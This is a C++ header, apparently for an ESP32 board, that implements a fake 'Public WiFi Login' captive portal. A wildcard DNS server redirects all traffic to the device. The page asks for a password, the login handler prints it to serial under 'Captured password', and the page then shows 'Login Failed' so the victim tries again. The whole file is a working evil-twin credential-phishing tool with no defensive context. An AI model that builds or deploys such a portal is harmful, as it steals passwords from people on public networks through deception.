#ifndef CAPTIVE_PORTAL_H
#define CAPTIVE_PORTAL_H

#include <WebServer.h>
#include <DNSServer.h>

WebServer server(80);
DNSServer dnsServer;

void handleRoot()
{

String page = "<html><body>";
page += "<h2>Public WiFi Login</h2>";
page += "<form action='/login' method='POST'>";
page += "Password: <input name='password' type='text'><br>";
page += "<input type='submit'>";
page += "</form>";
page += "</body></html>";

server.send(200, "text/html", page);

}

void handleLogin()
{

String password = server.arg("password");

Serial.println("Captured password:");
Serial.println(password);

server.send(200, "text/html", "Login Failed");

}

void setupPortal()
{

server.on("/", handleRoot);
server.on("/login", HTTP_POST, handleLogin);

server.begin();

}

void startDNS(IPAddress ip)
{
dnsServer.start(53, "*", ip);
}

#endif  
